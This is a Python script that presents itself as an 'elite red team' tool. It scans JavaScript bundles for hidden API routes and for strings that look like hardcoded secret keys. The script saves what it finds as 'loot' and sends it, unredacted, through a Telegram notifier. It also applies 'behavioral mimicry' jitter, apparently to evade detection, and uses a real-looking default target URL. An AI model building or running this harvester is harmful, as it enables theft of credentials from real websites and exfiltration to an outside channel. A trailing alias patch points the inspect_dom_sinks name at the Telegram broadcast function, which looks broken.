#!/usr/bin/env python3
"""
DOM_SINK_INSPECTOR.PY v8.6 — Client-Side JavaScript Bundle & Route Harvester (Elite Red Team Adversarial Edition)
Features:
- Extracts hidden API endpoints, fetch/axios routes, and internal paths from JS bundles with regex pattern matching
- Sniffs hardcoded configuration tokens or secret keys in client-side source code with SHA-256 cryptographic hashing
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
"""
import re
import json
import sys
import hashlib
import asyncio

# Import centralized framework telemetry, immutable loot persistence, behavioral mimicry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter

# Regex patterns for uncovering hidden API routes and endpoints inside JS chunks
ENDPOINT_PATTERN = re.compile(r'["\'](/api/[a-zA-Z0-9_\-/]+|/v\d+/[a-zA-Z0-9_\-/]+)["\']', re.I)
SECRET_PATTERN = re.compile(r'["\']([a-zA-Z0-9_\-]{20,45})["\']', re.I)

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous inspector functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

def inspect_js_bundle(bundle_content, target_context="https://cryptobytes.online", source_label="bundle.js"):
    """
    Parses JavaScript source text to uncover hidden routes and embedded credentials,
    automatically persisting discovered artifacts to disk with SHA-256 integrity hashes.
    """
    apply_behavioral_jitter()
    discovered_routes = set()
    potential_secrets = set()

    if not bundle_content:
        return sorted(list(discovered_routes)), sorted(list(potential_secrets))

    for match in ENDPOINT_PATTERN.findall(bundle_content):
        if len(match) > 3 and not match.endswith(('.js', '.css', '.png', '.jpg', '.svg')):
            discovered_routes.add(match)

    for match in SECRET_PATTERN.findall(bundle_content):
        # Filter out common benign strings (UUIDs, standard hashes length checks)
        if len(match) > 20 and not match.startswith(('http', 'sha', 'data')):
            potential_secrets.add(match)

    routes_list = sorted(list(discovered_routes))
    secrets_list = sorted(list(potential_secrets))

    # STREAM TELEMETRY & PERSIST DISCOVERED BUNDLE ARTIFACTS TO DISK WITH SHA-256 HASHING
    if routes_list or secrets_list:
        loot_hash = hashlib.sha256(bundle_content.encode("utf-8", errors="ignore")).hexdigest()
        bundle_evidence = {
            "source_file": source_label,
            "integrity_hash": loot_hash,
            "discovered_routes": routes_list,
            "potential_secrets": secrets_list
        }
        
        # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
        broadcast_tg_alert_sync("DOM Bundle Inspection Artifacts Harvested", bundle_evidence)
        stream_proof("DOM_BUNDLE_HARVEST", source_label, {"hash": loot_hash}, bundle_content[:300], bundle_evidence)
        save_session_loot(
            target=target_context,
            endpoint=source_label,
            finding_type="DOM_BUNDLE_INSPECTION_ARTEFACTS",
            status=200,
            headers={},
            body=bundle_content,
            extra_loot=bundle_evidence
        )

    return routes_list, secrets_list

if __name__ == "__main__":
    if len(sys.argv) > 1:
        with open(sys.argv[1], "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            routes, secrets = inspect_js_bundle(content, source_label=sys.argv[1])
            print(f"[+] Discovered Routes ({len(routes)}): {routes}")
            print(f"[+] Potential Secrets ({len(secrets)}): {secrets}")
    else:
        print("Usage: python3 dom_sink_inspector.py <js_bundle_file>")


# --- AUTOMATED ALIAS PATCH --- 
async def inspect_dom_sinks(*args, **kwargs):
    return await broadcast_tg_alert_async(*args, **kwargs)

